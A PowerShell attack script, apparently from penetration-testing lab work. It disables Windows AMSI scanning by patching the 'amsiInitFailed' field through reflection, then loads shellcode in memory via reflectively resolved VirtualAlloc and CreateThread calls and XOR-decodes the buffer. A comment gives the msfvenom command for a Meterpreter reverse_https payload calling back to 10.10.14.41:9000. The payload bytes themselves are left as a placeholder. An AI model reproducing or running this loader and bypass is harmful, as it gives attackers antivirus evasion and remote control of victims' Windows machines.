$a=[Ref].Assembly.GetTypes()
Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}}
$d=$c.GetFields('NonPublic,Static')
Foreach($e in $d) {if ($e.Name -like "*InitFailed") {$f=$e}}
$g=$f.SetValue($null,$true)

function LookupFunc {
    param ($moduleName, $functionName)
 
    $nm = ([AppDomain]::CurrentDomain.GetAssemblies() |
        Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
        Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    
    $mod = $nm.GetMethod('GetModuleHandle').Invoke($null, @($moduleName))
    return $nm.GetMethod('GetProcAddress', [Type[]]@([IntPtr], [String])).
        Invoke($null, @($mod, $functionName))
}

function GetDelegateType {
    Param (
        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
        [Parameter(Position = 1)] [Type] $retType = [Void]
    )
 
    $type = [AppDomain]::CurrentDomain.
        DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('RunDelegate')),
        [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
        DefineDynamicModule('InMemoryModule', $false).
        DefineType('RunDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',
        [System.MulticastDelegate])
 
    $type.DefineConstructor('RTSpecialName, HideBySig, Public',
        [System.Reflection.CallingConventions]::Standard, $func).
        SetImplementationFlags('Runtime, Managed')
        
    $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $retType, $func).
        SetImplementationFlags('Runtime, Managed')
 
    return $type.CreateType()
}

$lpMem = [System.Runtime.InteropServices.Marshal]::
    GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc),
        (GetDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).
    Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)

[Byte[]] $buf =  # meterpreter payload here: msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.41 LPORT=9000 -f powershell
                 # xor encode with: for($i=0; $i -lt $buf.count ; $i++) { $buf[$i] = $buf[$i] -bxor 0x6A }
for($i=0; $i -lt $buf.count ; $i++) { $buf[$i] = $buf[$i] -bxor 0x6A }

[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)
 
$hThread = [System.Runtime.InteropServices.Marshal]::
    GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread),
        (GetDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).
    Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)
 
[System.Runtime.InteropServices.Marshal]::
    GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject),
        (GetDelegateType @([IntPtr], [Int32]) ([Int]))).
    Invoke($hThread, 0xFFFFFFFF)

